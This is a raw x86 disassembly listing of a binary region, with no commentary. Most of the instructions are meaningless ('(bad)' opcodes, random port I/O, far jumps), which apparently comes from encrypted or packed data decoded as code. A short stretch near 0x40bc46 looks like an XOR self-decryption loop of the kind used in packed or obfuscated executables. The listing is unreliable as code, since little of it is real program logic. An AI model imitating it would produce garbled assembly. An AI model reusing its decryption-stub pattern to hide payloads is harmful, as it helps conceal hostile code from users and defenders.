  40b7d5:	mov    ebp,0x92bfb66a
  40b7da:	fisubr DWORD PTR [edx+eiz*4]
  40b7dd:	pop    ebx
  40b7de:	je     0x40b7f0
  40b7e0:	cmp    ebx,DWORD PTR [esi-0x55e68c0c]
  40b7e6:	pop    esi
  40b7e7:	pop    ss
  40b7e8:	push   ebp
  40b7e9:	ret    
  40b7ea:	loop   0x40b845
  40b7ec:	xor    BYTE PTR [ecx+0x38e1b7fa],al
  40b7f2:	mov    ds:0xd2399f5e,eax
  40b7f7:	out    0x36,al
  40b7f9:	and    DWORD PTR ds:0xddc1a67b,edx
  40b7ff:	push   0x7281a00d
  40b804:	mov    bh,0xc
  40b806:	(bad)  
  40b807:	pop    ecx
  40b808:	mov    ecx,0xa86124d
  40b80d:	adc    al,0xec
  40b80f:	iret   
  40b810:	mov    dl,BYTE PTR [ebp-0x36]
  40b813:	mov    esp,0xc6e58f92
  40b818:	xor    edx,ebp
  40b81a:	add    DWORD PTR [esi+edx*8+0x74],esi
  40b81e:	fsub   QWORD PTR [ebx-0x59d67454]
  40b824:	xchg   BYTE PTR [ecx+ebx*1],dl
  40b827:	lds    edx,FWORD PTR [edx-0x1a]
  40b82a:	out    0x7a,eax
  40b82c:	mov    ebp,0x9ce46813
  40b831:	adc    eax,0xd365f4ac
  40b836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b837:	ret    0xfa75
  40b83a:	fdiv   QWORD PTR [eax+0x71692891]
  40b840:	imul   edx,DWORD PTR [ebx],0xf7d5b707
  40b846:	(bad)  
  40b847:	rol    DWORD PTR [esi-0x2c],1
  40b84a:	xor    BYTE PTR [eax-0x18],cl
  40b84d:	sub    edx,DWORD PTR [ebp+eax*8+0x3a63ab09]
  40b854:	in     eax,0x7e
  40b856:	push   ebx
  40b857:	pop    eax
  40b858:	cmp    ecx,ebx
  40b85a:	add    al,ah
  40b85c:	scas   ax,WORD PTR es:[edi]
  40b85e:	sub    esp,DWORD PTR [ebx-0x4978099f]
  40b864:	pushf  
  40b865:	nop
  40b866:	push   ds
  40b867:	fdiv   st(6),st
  40b869:	push   0x5be35df3
  40b86e:	in     al,dx
  40b86f:	mov    bh,0xd3
  40b871:	xchg   ebp,eax
  40b872:	rcr    BYTE PTR [esi-0x45751d07],1
  40b878:	adc    al,0xc
  40b87a:	aad    0x1a
  40b87c:	les    edx,FWORD PTR [ecx]
  40b87e:	mov    ds:0x5fbd6a59,al
  40b883:	xor    bl,BYTE PTR [ebp+0x437d6e93]
  40b889:	mov    al,0x7
  40b88b:	rcr    DWORD PTR [eax-0x39],1
  40b88e:	dec    ebx
  40b88f:	xchg   BYTE PTR [esi-0x6a],dh
  40b892:	and    al,0x48
  40b894:	test   DWORD PTR [eax],eax
  40b896:	fld    TBYTE PTR [esp+eiz*2-0x4df9ac59]
  40b89d:	test   dl,dh
  40b89f:	ds out dx,al
  40b8a1:	dec    ebp
  40b8a2:	mov    bl,dl
  40b8a4:	mov    ebx,0xe9f83098
  40b8a9:	jmp    0xdaec:0x4b0eb33a
  40b8b0:	dec    esi
  40b8b1:	pop    ss
  40b8b2:	loopne 0x40b88a
  40b8b4:	xchg   esi,eax
  40b8b5:	mov    eax,ds:0x98d81d8b
  40b8ba:	sub    edi,DWORD PTR [edx]
  40b8bc:	mov    al,BYTE PTR [ebp+ebp*8+0x3c6983af]
  40b8c3:	mov    eax,ds:0x530f982f
  40b8c8:	std    
  40b8c9:	pushf  
  40b8ca:	jp     0x40b858
  40b8cc:	call   0x593db246
  40b8d1:	hlt    
  40b8d2:	es clc 
  40b8d4:	pop    ds
  40b8d5:	pop    ss
  40b8d6:	fbstp  TBYTE PTR [esi-0x69dabb54]
  40b8dc:	add    al,0xa1
  40b8de:	lods   eax,DWORD PTR ds:[esi]
  40b8df:	out    0xe0,al
  40b8e1:	push   ebx
  40b8e2:	es test eax,0xcabe5123
  40b8e8:	es gs enter 0xf9d2,0x6b
  40b8ee:	ret    0x4b9d
  40b8f1:	xor    esp,DWORD PTR [esp+eax*8]
  40b8f4:	cmc    
  40b8f5:	enter  0xed57,0x8a
  40b8f9:	xor    eax,0xcee2d4e7
  40b8fe:	mov    WORD PTR [ecx],cs
  40b900:	mov    ds:0x1c0b7ad2,al
  40b905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b906:	adc    eax,0x8af63ef7
  40b90b:	dec    ecx
  40b90c:	or     esp,DWORD PTR ds:0x65efc475
  40b912:	fmul   DWORD PTR [ebp+0x3d]
  40b915:	(bad)  
  40b916:	test   al,0x31
  40b918:	jnp    0x40b929
  40b91a:	test   BYTE PTR [edi],ah
  40b91c:	add    eax,DWORD PTR [eax]
  40b91e:	add    BYTE PTR [ebx+0x2081f045],cl
  40b924:	sbb    BYTE PTR [esi*2-0x3451700],0xff
  40b92c:	(bad)  
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	rcr    DWORD PTR [edx-0x11],cl
  40b940:	push   ebp
  40b941:	out    dx,al
  40b942:	(bad)  
  40b943:	mov    WORD PTR [eax+0x78],?
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	in     eax,0x4a
  40b94c:	cmp    eax,0xebb4e6b9
  40b951:	adc    esp,DWORD PTR [esi]
  40b953:	mov    esi,0x1cbadba6
  40b958:	jae    0x40b993
  40b95a:	sub    eax,0xda10211c
  40b95f:	out    dx,al
  40b960:	pop    edx
  40b961:	fwait
  40b962:	cmp    ch,BYTE PTR [eax+ebp*1+0x2d665974]
  40b969:	hlt    
  40b96a:	mov    edx,0x3cf550b5
  40b96f:	enter  0xd805,0x40
  40b973:	jne    0x40b958
  40b975:	mov    ds:0x5accc3c6,al
  40b97a:	jbe    0x40b9ab
  40b97c:	adc    eax,0x6e4c4267
  40b981:	cld    
  40b982:	xchg   ah,ch
  40b984:	push   es
  40b985:	cmp    DWORD PTR [edx+0x545ec9a2],ebp
  40b98b:	scas   al,BYTE PTR es:[edi]
  40b98c:	mov    eax,ds:0xd4c96293
  40b991:	ret    0xf554
  40b994:	jae    0x40b9f8
  40b996:	adc    DWORD PTR [ecx-0x61],edi
  40b999:	jno    0x40b927
  40b99b:	inc    ecx
  40b99c:	jo     0x48f6bb0c
  40b9a2:	in     al,dx
  40b9a3:	mov    di,0x7695
  40b9a7:	and    esp,DWORD PTR [eax-0x2101199a]
  40b9ad:	or     esp,DWORD PTR [eax+0x406f1c9f]
  40b9b3:	cmp    bh,cl
  40b9b5:	inc    ecx
  40b9b6:	out    dx,eax
  40b9b7:	add    eax,DWORD PTR [ebp+0x4b]
  40b9ba:	(bad)  
  40b9bb:	push   ss
  40b9bc:	call   0xf28f0987
  40b9c1:	scas   al,BYTE PTR es:[edi]
  40b9c2:	and    BYTE PTR [eax+0x7975bd25],bh
  40b9c8:	(bad)  
  40b9cb:	mov    eax,ds:0xf8f61090
  40b9d0:	imul   ebp,DWORD PTR [ecx],0xb1c7961c
  40b9d6:	repnz sbb dl,dl
  40b9d9:	xor    eax,0xcee048c7
  40b9de:	push   ds
  40b9df:	pop    es
  40b9e0:	or     eax,DWORD PTR [eax]
  40b9e2:	xchg   ebx,eax
  40b9e3:	mov    dl,BYTE PTR [edi]
  40b9e5:	in     al,0xd2
  40b9e7:	jmp    0xae3998c2
  40b9ec:	sbb    DWORD PTR [esi+esi*1],edx
  40b9ef:	imul   ebp,DWORD PTR [esi],0x38846eac
  40b9f5:	jmp    0xdcb6:0x3cdc60c4
  40b9fc:	mov    ah,0xd3
  40b9fe:	(bad)  
  40ba00:	sbb    al,0xcd
  40ba02:	inc    eax
  40ba03:	mov    ebp,0xb7fd662c
  40ba08:	mov    eax,0xd2af1b80
  40ba0d:	outs   dx,DWORD PTR ds:[esi]
  40ba0e:	dec    edx
  40ba0f:	cmp    BYTE PTR [ecx-0x6a0db193],dl
  40ba15:	fst    DWORD PTR [esi+ebp*2+0x36]
  40ba19:	retf   0x72
  40ba1c:	(bad)  
  40ba1d:	cmp    BYTE PTR [ecx+eiz*4],ah
  40ba20:	or     ebx,DWORD PTR [esi+0x77]
  40ba23:	mov    cl,0xd9
  40ba25:	fwait
  40ba26:	sbb    edi,DWORD PTR [edi+0x52]
  40ba29:	retf   
  40ba2a:	pop    ebx
  40ba2b:	mov    dl,0x99
  40ba2d:	pop    ebx
  40ba2e:	sbb    al,dh
  40ba30:	add    BYTE PTR [esi+0x17],dl
  40ba33:	or     eax,0x1e21d497
  40ba38:	jmp    0x40b9be
  40ba3a:	pop    es
  40ba3b:	loope  0x40ba56
  40ba3d:	mov    ds:0xfb934e13,eax
  40ba42:	mov    ebp,0x9023b2b4
  40ba47:	lock dec esp
  40ba49:	dec    ecx
  40ba4a:	push   ss
  40ba4b:	ja     0x40baca
  40ba4d:	fcomp  DWORD PTR [ebp+0x41]
  40ba50:	enter  0x4cf8,0xf
  40ba54:	xor    ecx,DWORD PTR [eax]
  40ba56:	hlt    
  40ba57:	adc    BYTE PTR [esi-0x2f786612],bh
  40ba5d:	pop    ebx
  40ba5e:	mov    DWORD PTR [ecx+0x2948a7d3],ebp
  40ba64:	or     al,0xa4
  40ba66:	(bad)  
  40ba67:	mov    cl,0x63
  40ba69:	cmp    DWORD PTR [eax+0x3dc7e0b0],esp
  40ba6f:	sbb    eax,0xbc79bb8
  40ba74:	(bad)  
  40ba75:	or     dh,BYTE PTR es:[eax-0x21]
  40ba79:	mov    DWORD PTR [edx+0x55d5b10b],esp
  40ba7f:	jns    0x40baa8
  40ba81:	outs   dx,BYTE PTR ds:[esi]
  40ba82:	or     eax,0x1087a1b2
  40ba87:	int    0x8d
  40ba89:	cli    
  40ba8a:	xchg   ecx,eax
  40ba8b:	mov    bh,cl
  40ba8d:	pop    ds
  40ba8e:	add    eax,0xcd24adc3
  40ba93:	push   ds
  40ba94:	jmp    0x40ba86
  40ba96:	rol    cl,0x8
  40ba99:	out    dx,eax
  40ba9a:	inc    edx
  40ba9b:	xchg   esi,eax
  40ba9c:	mov    bl,0x2e
  40ba9e:	je     0x40ba5e
  40baa0:	cmp    eax,0x331dfbb4
  40baa5:	inc    esp
  40baa6:	mov    edi,0x3b61c3ed
  40baab:	loope  0x40ba46
  40baad:	bound  edx,QWORD PTR [edx+0xf1fbd62]
  40bab3:	loopne 0x40bae7
  40bab5:	dec    esp
  40bab6:	pop    eax
  40bab7:	(bad)  
  40bab8:	adc    ah,bh
  40baba:	test   BYTE PTR [ebp+edi*8-0x7e],ch
  40babe:	mov    dl,0xac
  40bac0:	xchg   esp,eax
  40bac1:	sub    DWORD PTR [esi],edi
  40bac3:	(bad)  
  40bac4:	xor    esp,DWORD PTR [ebx-0x12]
  40bac7:	(bad)  
  40bac8:	shr    al,1
  40baca:	retf   0xf16d
  40bacd:	ret    
  40bace:	int    0x2b
  40bad0:	addr16 sbb dl,ah
  40bad3:	adc    BYTE PTR [edx-0x76],dh
  40bad6:	in     al,0xdb
  40bad8:	call   0x35b68a7c
  40badd:	cmc    
  40bade:	xchg   esp,eax
  40badf:	pop    ebx
  40bae0:	and    bh,BYTE PTR [ecx]
  40bae2:	or     DWORD PTR [edx],0x48
  40bae5:	enter  0x8aef,0x6a
  40bae9:	retf   0xbadb
  40baec:	mov    edi,0xdfed02dc
  40baf1:	dec    eax
  40baf2:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baf4:	adc    esp,esp
  40baf6:	and    BYTE PTR cs:[ebx],dh
  40baf9:	cdq    
  40bafa:	xchg   DWORD PTR [esi+0x2eb55331],ebp
  40bb00:	and    eax,0x25e205dc
  40bb05:	or     BYTE PTR [eax],bl
  40bb07:	mov    edi,0x44f849a0
  40bb0c:	arpl   WORD PTR [edi],bx
  40bb0e:	in     al,dx
  40bb0f:	sahf   
  40bb10:	or     DWORD PTR [eax+0x6f],0x4c58688e
  40bb17:	cmp    edi,ebp
  40bb19:	ds pushf 
  40bb1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb1c:	sar    esp,1
  40bb1e:	sbb    edi,eax
  40bb20:	sub    ebp,0x8
  40bb23:	mov    al,0xd9
  40bb25:	fbstp  TBYTE PTR [esi-0x6e]
  40bb28:	mov    esi,0x4add9ca9
  40bb2d:	fisttp DWORD PTR [eax]
  40bb2f:	fadd   st(7),st
  40bb31:	test   BYTE PTR ds:0x8706cf59,bh
  40bb37:	xor    eax,0x94e14b03
  40bb3c:	(bad)  
  40bb3d:	jle    0x40bacb
  40bb3f:	ins    DWORD PTR es:[edi],dx
  40bb40:	inc    ebx
  40bb41:	pop    esp
  40bb42:	in     al,dx
  40bb43:	sbb    cl,BYTE PTR ds:0xf97f81cd
  40bb49:	inc    edi
  40bb4a:	mov    esi,0x46787a6e
  40bb4f:	or     ebp,DWORD PTR [ecx]
  40bb51:	adc    esi,eax
  40bb53:	mov    ah,0xb9
  40bb55:	(bad)  
  40bb56:	(bad)  
  40bb57:	into   
  40bb58:	arpl   dx,ax
  40bb5a:	push   0xc91d5c43
  40bb5f:	enter  0xa3a9,0x5c
  40bb63:	inc    esi
  40bb64:	sub    BYTE PTR [ebx-0x6d],dh
  40bb67:	arpl   si,di
  40bb69:	fwait
  40bb6a:	mov    edx,ecx
  40bb6c:	out    dx,eax
  40bb6d:	pusha  
  40bb6e:	in     al,0xf0
  40bb70:	call   DWORD PTR [ecx]
  40bb72:	sub    ebp,DWORD PTR [eax-0x31]
  40bb75:	cmp    DWORD PTR [esp+ecx*4-0x7474e30c],ebp
  40bb7c:	xor    esi,DWORD PTR [ebp+0x7e]
  40bb7f:	loop   0x40bbb7
  40bb81:	or     al,0xcb
  40bb83:	mov    eax,0xdac11e7e
  40bb88:	sub    ch,BYTE PTR ds:[esi+0x70b7c958]
  40bb8f:	pop    edi
  40bb90:	in     eax,dx
  40bb91:	jl     0x40bb81
  40bb93:	(bad)  [ecx-0x5c]
  40bb96:	jmp    0x40bb82
  40bb98:	sbb    DWORD PTR [eax+0x3f],0xffffffda
  40bb9c:	dec    ebx
  40bb9d:	and    eax,0x39808dc
  40bba2:	cdq    
  40bba3:	mov    cs,edx
  40bba5:	je     0x40bb5c
  40bba7:	adc    esp,edx
  40bba9:	dec    ecx
  40bbaa:	shl    DWORD PTR [edi+0x627084a1],cl
  40bbb0:	pop    es
  40bbb1:	out    0xc4,eax
  40bbb3:	bound  ebp,QWORD PTR ds:0xc845d8c8
  40bbb9:	inc    eax
  40bbba:	cdq    
  40bbbb:	imul   ebx,ecx,0xffffffcb
  40bbbe:	jns    0x40bbdc
  40bbc0:	cwde   
  40bbc1:	adc    DWORD PTR [ebx+edx*2],ecx
  40bbc4:	xor    DWORD PTR [eax-0x3],edx
  40bbc7:	jne    0x40bc08
  40bbc9:	not    BYTE PTR [edi]
  40bbcb:	adc    al,dh
  40bbcd:	(bad)  
  40bbce:	stos   DWORD PTR es:[edi],eax
  40bbcf:	ror    BYTE PTR [ecx+0x70],cl
  40bbd2:	pop    edi
  40bbd3:	cmp    DWORD PTR [edi],esp
  40bbd5:	pop    edx
  40bbd6:	test   eax,0xd02eb182
  40bbdb:	das    
  40bbdc:	out    0xac,al
  40bbde:	popf   
  40bbdf:	out    dx,al
  40bbe0:	jb     0x40bc60
  40bbe2:	sti    
  40bbe3:	dec    eax
  40bbe4:	adc    al,BYTE PTR [esi+0x7ee2cd14]
  40bbea:	test   al,0x95
  40bbec:	inc    edi
  40bbed:	pushf  
  40bbee:	jb     0x40bc4b
  40bbf0:	or     DWORD PTR [ecx+edx*4+0x625b8525],esp
  40bbf7:	ret    0x1b4e
  40bbfa:	loopne 0x40bb97
  40bbfc:	add    DWORD PTR [edi],esp
  40bbfe:	sar    DWORD PTR [ebp+0x6d4c30f1],0x9f
  40bc05:	add    ebx,ebp
  40bc07:	sbb    eax,0x475806cc
  40bc0c:	icebp  
  40bc0d:	mov    ds:0x81f7e110,eax
  40bc12:	loope  0x40bc6e
  40bc14:	shl    DWORD PTR [edi-0x5b],1
  40bc17:	dec    esi
  40bc18:	int    0x21
  40bc1a:	sub    BYTE PTR [esi],0x11
  40bc1d:	jg     0x40bc0d
  40bc1f:	jp     0x40bc35
  40bc21:	mov    DWORD PTR [edx-0x6be3f63],esi
  40bc27:	xor    eax,0xa32ad0e0
  40bc2c:	add    cl,BYTE PTR [eax+0x71]
  40bc2f:	cmp    al,0xbf
  40bc31:	pop    ss
  40bc32:	jle    0x40bc23
  40bc34:	cmp    BYTE PTR [eax+ebx*2-0xb],0x89
  40bc39:	jns    0x40bc54
  40bc3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc3c:	nop
  40bc3d:	dec    ebp
  40bc3e:	out    0x20,al
  40bc40:	sbb    cl,BYTE PTR [edi]
  40bc42:	pushf  
  40bc43:	(bad)  
  40bc44:	push   cs
  40bc45:	sti    
  40bc46:	mov    eax,DWORD PTR [ebp-0xc]
  40bc49:	mov    edx,DWORD PTR [ebp-0x18]
  40bc4c:	or     eax,edx
  40bc4e:	cmp    eax,0xfa9f7e76
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bcf3
  40bc7d:	mov    al,0xf1
  40bc7f:	dec    ebp
  40bc80:	ret    0x7891
  40bc83:	js     0x40bcf9
  40bc85:	jle    0x40bcff
  40bc87:	js     0x40bc4a
  40bc89:	xor    DWORD PTR [ecx+eax*8],ebp
  40bc8c:	addr16 mov edx,0x70251f56
  40bc92:	mov    al,ds:0x2bb374bf
  40bc97:	xor    al,0xe8
  40bc99:	jg     0x40bcdf
  40bc9b:	inc    edx
  40bc9c:	cwde   
  40bc9d:	aas    
  40bc9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc9f:	mov    ebx,0xf375f946
  40bca4:	outs   dx,DWORD PTR ds:[esi]
  40bca5:	enter  0x3168,0xf5
  40bca9:	push   esi
  40bcaa:	dec    ecx
  40bcab:	push   edi
  40bcac:	leave  
  40bcad:	mov    ds:0xf8d19262,eax
  40bcb2:	jmp    0x924e:0x9a87ac10
  40bcb9:	mov    ah,0xaa
  40bcbb:	aaa    
  40bcbc:	addr16 inc ecx
  40bcbe:	mov    WORD PTR [esi-0x7f855a32],?
  40bcc4:	mov    ebx,0xa94c8ab8
  40bcc9:	call   0x9d680fab
  40bcce:	cld    
  40bccf:	or     BYTE PTR [ecx+edi*1-0x4d],0xeb
  40bcd4:	repz or DWORD PTR [edx+eax*8],0x8f9e5ad3
  40bcdc:	lock xchg esp,eax
  40bcde:	push   cs
  40bcdf:	mov    ch,BYTE PTR [edx-0x54796268]
  40bce5:	aad    0x72
  40bce7:	jnp    0x40bc9a
  40bce9:	aam    0x5b
  40bceb:	out    dx,al
  40bcec:	mov    bl,BYTE PTR [eax-0x6d]
  40bcef:	(bad)  
  40bcf0:	daa    
  40bcf1:	jg     0x40bd26
  40bcf3:	cmp    BYTE PTR [ecx-0x5097fda9],cl
  40bcf9:	test   DWORD PTR [esi+0x26],ebp
  40bcfc:	sub    esp,DWORD PTR [edi-0x12e14dbf]
  40bd02:	mov    ah,0x58
  40bd04:	xor    al,0x69
  40bd06:	jo     0x40bca3
  40bd08:	and    bh,dh
  40bd0a:	retf   0xc6f8
  40bd0d:	fimul  WORD PTR [eax-0x4f]
  40bd10:	stos   BYTE PTR es:[edi],al
  40bd11:	pop    ebx
  40bd12:	repz into 
  40bd14:	sub    eax,0x6beee3a1
  40bd19:	ss in  eax,dx
  40bd1b:	jae    0x40bcfe
  40bd1d:	fs push ebp
  40bd1f:	test   al,0x87
  40bd21:	bound  ebp,QWORD PTR [ebx+0x1e92257]
  40bd27:	xchg   ch,bl
  40bd29:	aam    0x77
  40bd2b:	jne    0x40bd8e
  40bd2d:	push   0xfffffff0
  40bd2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd30:	repz je 0x40bda0
  40bd33:	ret    
  40bd34:	out    0x7a,eax
  40bd36:	jno    0x40bd28
  40bd38:	push   es
  40bd39:	jnp    0x40bd21
  40bd3b:	ins    BYTE PTR es:[edi],dx
  40bd3c:	bound  ebx,QWORD PTR [ecx]
  40bd3e:	dec    ebx
  40bd3f:	mov    dh,0x57
  40bd41:	clc    
  40bd42:	pop    DWORD PTR [esi-0x9]
  40bd45:	sbb    esp,ebx
  40bd47:	jecxz  0x40bd05
  40bd49:	jb     0x40bd0f
  40bd4b:	shl    BYTE PTR [ecx],cl
  40bd4d:	jl     0x40bcdc
  40bd4f:	cmovno edi,eax
  40bd52:	cwde   
  40bd53:	cs stos DWORD PTR es:[edi],eax
  40bd55:	cmc    
  40bd56:	push   esi
  40bd57:	popa   
  40bd58:	mov    BYTE PTR [edi+esi*8-0x6dee3cec],ah
  40bd5f:	sbb    al,0x3a
  40bd61:	push   edx
  40bd62:	fs out dx,eax
  40bd64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd65:	push   ebp
  40bd66:	pop    eax
  40bd67:	sbb    eax,0xd0b6e2ef
  40bd6c:	fadd   DWORD PTR [edx-0xc]
  40bd6f:	mov    ds,ecx
  40bd71:	mov    dh,0xe2
  40bd73:	nop
  40bd74:	test   eax,0xe002c877
  40bd79:	addr16 out 0x6f,eax
  40bd7c:	xchg   edi,eax
  40bd7d:	cwde   
  40bd7e:	pop    esi
  40bd7f:	dec    eax
  40bd80:	add    edx,DWORD PTR [edx+0x66]
  40bd83:	lea    ebp,[ecx-0x2e0f0c80]
  40bd89:	pop    eax
  40bd8a:	xchg   edx,eax
  40bd8b:	inc    edi
  40bd8c:	cwde   
  40bd8d:	or     al,0xc
  40bd8f:	repz push ebp
  40bd91:	pop    ecx
  40bd92:	int    0x6c
  40bd94:	pusha  
  40bd95:	sar    BYTE PTR [ecx],cl
  40bd97:	daa    
  40bd98:	mov    ch,0xc6
  40bd9a:	dec    edi
  40bd9b:	inc    esi
  40bd9c:	adc    DWORD PTR [ebx-0x1cfe510d],0xb78c09ac
  40bda6:	sbb    al,0x6f
  40bda8:	fadd   DWORD PTR [esi+0x1]
  40bdab:	ins    DWORD PTR es:[edi],dx
  40bdac:	sar    DWORD PTR [ecx],0x9d
  40bdaf:	fmul   st(2),st
  40bdb1:	outs   dx,BYTE PTR fs:[esi]
  40bdb3:	mov    ebx,0x581b420f
  40bdb8:	test   DWORD PTR [ecx-0x26],0xb200f576
  40bdbf:	ret    0xecbf
  40bdc2:	mov    eax,ds:0xb8a81256
  40bdc7:	fstp   QWORD PTR [esi+0x719eec96]
  40bdcd:	rcr    DWORD PTR [edi-0x70],0x8f
  40bdd1:	jge    0x40bdf6
  40bdd3:	shl    BYTE PTR ds:0xde063176,1
  40bdd9:	push   ss
  40bdda:	jbe    0x40bde8
  40bddc:	and    DWORD PTR [eax-0x2],edx
  40bddf:	mov    ds:0xaab86813,eax
  40bde4:	call   0x1858:0x886633cd
  40bdeb:	sub    ecx,DWORD PTR [edx-0x3229d20e]
  40bdf1:	jb     0x40be00
  40bdf3:	mov    ds:0xa5d0a36e,al
  40bdf8:	lds    eax,FWORD PTR [ecx+0x32]
  40bdfb:	out    0xa6,eax
  40bdfd:	ret    
  40bdfe:	dec    esi
  40bdff:	and    BYTE PTR [ecx],bl
  40be01:	jg     0x40be14
  40be03:	sahf   
  40be04:	stos   DWORD PTR es:[edi],eax
  40be05:	ds data16 fwait
  40be08:	gs into 
  40be0a:	jge    0x40be66
  40be0c:	jp     0x40bde7
  40be0e:	daa    
  40be0f:	cmp    BYTE PTR [ebp-0x50],bh
  40be12:	jle    0x40be70
  40be14:	stos   BYTE PTR es:[edi],al
  40be15:	dec    esp
  40be16:	call   0x6182f457
  40be1b:	mov    ?,WORD PTR [ecx+0x7e6075cc]
  40be21:	pushf  
  40be22:	lahf   
  40be23:	dec    eax
  40be24:	mov    WORD PTR [ebp-0x17fbd8df],ds
  40be2a:	fdivr  QWORD PTR [esi-0x6ad005b0]
  40be30:	pop    ss
  40be31:	add    ebx,edx
  40be33:	je     0x40be1c
  40be35:	cmp    al,0xcc
  40be37:	icebp  
  40be38:	or     al,0x40
  40be3a:	mov    dh,dh
  40be3c:	mov    al,0x21
  40be3f:	cwde   
  40be40:	xor    eax,0xee5e627d
  40be45:	pop    es
  40be46:	push   es
  40be47:	gs addr16 dec edi
  40be4a:	pop    esp
  40be4b:	cdq    
  40be4c:	pop    ds
  40be4d:	add    dh,BYTE PTR [ebx+0x25d2ad77]
  40be53:	ror    DWORD PTR [eax-0x1a],1
  40be56:	and    al,0xbb
  40be58:	out    dx,eax
  40be59:	shl    BYTE PTR [esi+0x6c],0xac
  40be5d:	or     BYTE PTR [esi],al
  40be5f:	repz not cl
  40be62:	xchg   ebp,eax
  40be63:	das    
  40be64:	jbe    0x40be7d
  40be66:	cmc    
  40be67:	and    ebp,DWORD PTR [edi-0x4a]
  40be6a:	ins    DWORD PTR es:[edi],dx
  40be6b:	mov    ecx,0x3408daf6
  40be70:	pusha  
  40be71:	inc    ebp
  40be72:	adc    al,0xc0
  40be74:	inc    ecx
  40be75:	gs dec ebx
  40be77:	push   ebx
  40be78:	cld    
  40be79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be7a:	les    esp,FWORD PTR [ebx]
  40be7c:	or     dh,BYTE PTR [edi-0x4f]
  40be7f:	mov    dh,0x52
  40be81:	cmc    
  40be82:	push   edx
  40be83:	mov    edi,0xf63b3126
  40be88:	mov    eax,ds:0xa33964ae
  40be8d:	pop    eax
  40be8e:	add    edx,DWORD PTR [bx+di+0x1b]
  40be92:	mov    ds:0x1e6853be,al
  40be97:	nop
  40be98:	add    ebp,DWORD PTR [ebx]
  40be9a:	adc    BYTE PTR [ecx-0x53f5c51b],cl
  40bea0:	popf   
  40bea1:	(bad)  
  40bea2:	push   ds
  40bea3:	inc    edi
  40bea4:	lahf   
  40bea5:	dec    ecx
  40bea6:	popa   
  40bea7:	sar    BYTE PTR [esi],0xb7
  40beaa:	mov    ds:0x8b7bffa9,eax
  40beaf:	push   ebx
  40beb0:	sar    ah,1
  40beb2:	lods   eax,DWORD PTR ds:[esi]
  40beb3:	scas   eax,DWORD PTR es:[edi]
  40beb4:	dec    edx
  40beb5:	xchg   esp,eax
  40beb6:	daa    
  40beb7:	jmp    FWORD PTR [eax+0x9]
  40beba:	aam    0x46
  40bebc:	icebp  
  40bebd:	not    BYTE PTR [eax+0x25]
  40bec0:	scas   eax,DWORD PTR es:[edi]
  40bec1:	jle    0x40bf12
  40bec3:	xor    BYTE PTR [esi],0x42
  40bec6:	les    esp,FWORD PTR [eax+edi*8-0x48]
  40beca:	hlt    
  40becb:	inc    eax
  40becc:	fcomp  DWORD PTR [esp+ecx*2-0x436303a]
  40bed3:	outs   dx,BYTE PTR ds:[esi]
  40bed4:	add    al,0xb2
  40bed6:	jnp    0x40bf52
  40bed8:	or     ah,0xa0
  40bedb:	jmp    0xdfab:0x7e507665
  40bee2:	cmp    al,0x5b
  40bee4:	cmp    edi,DWORD PTR [esi]
  40bee6:	loope  0x40bf4e
  40bee8:	ss inc ebx
  40beea:	jae    0x40bee8
  40beec:	jecxz  0x40bf2f
  40beee:	js     0x40be72
  40bef0:	aas    
  40bef1:	jle    0x40beaa
  40bef3:	push   0x70
  40bef5:	xchg   edi,eax
  40bef6:	scas   al,BYTE PTR es:[edi]
  40bef7:	or     DWORD PTR [edi+edx*8],edx
  40befa:	mov    dl,0x81
  40befc:	mov    bl,0x78
  40befe:	fldcw  WORD PTR [ebx-0x74]
  40bf01:	mov    cl,0x5b
  40bf03:	cmp    bh,BYTE PTR [edi]
  40bf05:	jmp    0x5bbd3e92
  40bf0a:	mov    al,ds:0x96c912b
  40bf0f:	cdq    
  40bf10:	pop    edx
  40bf11:	fucom  st(7)
  40bf13:	test   ecx,0xac3e74f9
  40bf19:	shl    BYTE PTR [esi-0x49],1
  40bf1c:	mov    ecx,0xf46061dc
  40bf21:	sub    eax,0xfa92308e
  40bf26:	in     al,0x45
  40bf28:	push   0x1f
  40bf2a:	xchg   ebx,eax
  40bf2b:	arpl   WORD PTR [ebp-0x5f],bx
  40bf2e:	mov    bh,0x2f
  40bf30:	repnz les esi,FWORD PTR [ecx+0x2c84fc46]
  40bf37:	aad    0xb9
  40bf39:	inc    esi
  40bf3a:	in     al,0xd8
  40bf3c:	jmp    0x73a3:0xf8de3849
  40bf43:	das    
  40bf44:	je     0x40bf49
  40bf46:	test   bh,al
  40bf48:	xchg   esi,eax
  40bf49:	int    0x5a
  40bf4b:	mov    ds:0x6316242,al
  40bf50:	mov    al,ds:0x8ba0d707
  40bf55:	das    
  40bf56:	sub    al,0x83
  40bf58:	mov    WORD PTR [edi],gs
  40bf5a:	xor    DWORD PTR [edx+0x78],esp
  40bf5d:	mov    eax,0x1c925110
  40bf62:	sub    eax,0xb73420bb
  40bf67:	or     bh,BYTE PTR [ecx]
  40bf69:	scas   al,BYTE PTR es:[edi]
  40bf6a:	fbstp  TBYTE PTR [ebx-0x13331f8f]
  40bf70:	ja     0x40bf48
  40bf72:	inc    edi
  40bf73:	adc    ah,BYTE PTR [ecx-0x7e]
  40bf76:	stc    
  40bf77:	addr16 out dx,eax
